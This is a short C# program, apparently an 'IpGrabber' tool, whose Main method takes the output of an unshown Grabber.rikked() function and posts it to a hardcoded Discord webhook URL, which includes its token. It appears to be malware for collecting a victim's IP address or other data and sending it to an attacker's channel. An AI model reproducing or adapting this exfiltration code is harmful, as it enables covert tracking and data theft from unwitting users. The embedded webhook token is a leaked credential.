using System;
using System.Net;
using System.Collections.Specialized;

namespace IpGrabber
{
    class Program
    {
        static void Main(string[] args)
        {
            string webhook = "https://discord.com/api/webhooks/911338915233935401/J--ja5mETW4iPBNoX6jxblQUSn9MLqfj4t8ZT9KwLEIZ-xUKUaZ_jnpBIEtZfgCcvEX1";


            var wbc = new WebClient();
            var data = new NameValueCollection();
            data["content"] = Grabber.rikked();
            wbc.UploadValues(webhook, data);

        }

    }
}
